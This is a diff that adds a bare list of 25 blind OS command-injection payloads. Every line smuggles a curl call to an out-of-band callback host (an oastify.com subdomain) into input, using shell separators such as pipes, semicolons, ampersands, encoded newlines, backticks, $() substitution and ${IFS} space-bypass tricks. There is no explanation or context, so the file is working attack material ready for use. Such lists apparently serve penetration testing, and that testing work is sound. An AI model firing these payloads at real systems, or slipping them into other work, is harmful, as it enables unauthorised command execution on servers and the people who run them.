@@ -1,0 +1,25 @@
+|curl -sk http://84ab8biczjsb682bxde348roefk58u.oastify.com
+||curl -sk http://84ab8biczjsb682bxde348roefk58u.oastify.com
+;curl -sk http://84ab8biczjsb682bxde348roefk58u.oastify.com
+&&curl -sk http://84ab8biczjsb682bxde348roefk58u.oastify.com
+&curl -sk http://84ab8biczjsb682bxde348roefk58u.oastify.com
+%0acurl -sk http://84ab8biczjsb682bxde348roefk58u.oastify.com
+`curl -sk http://84ab8biczjsb682bxde348roefk58u.oastify.com`
+$(curl -sk http://84ab8biczjsb682bxde348roefk58u.oastify.com)
+&curl${IFS}-sk${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com
+;curl${IFS}-sk${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com
+|curl${IFS}-sk${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com
+||curl${IFS}-sk${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com
+&&curl${IFS}-sk${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com
+%0acurl${IFS}-sk${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com
+`curl${IFS}-sk${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com`
+$(curl${IFS}-sk${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com)
+&curl${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com
+;curl${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com
+|curl${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com
+||curl${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com
+&&curl${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com
+%0acurl${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com
+`curl${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com`
+$(curl${IFS}http://84ab8biczjsb682bxde348roefk58u.oastify.com)
+curl -sk http://84ab8biczjsb682bxde348roefk58u.oastify.com
